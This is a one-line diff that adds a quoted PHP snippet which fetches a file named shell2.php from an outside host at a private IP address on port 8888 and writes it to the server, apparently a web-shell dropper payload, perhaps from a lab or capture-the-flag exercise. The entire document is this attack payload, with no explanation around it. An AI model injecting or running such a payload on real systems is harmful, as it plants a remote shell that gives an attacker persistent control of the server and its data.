@@ -1,0 +1,1 @@
+"<?php file_put_contents('shell2.php', file_get_contents('http://10.9.8.166:8888/shell2.php')) ?>"
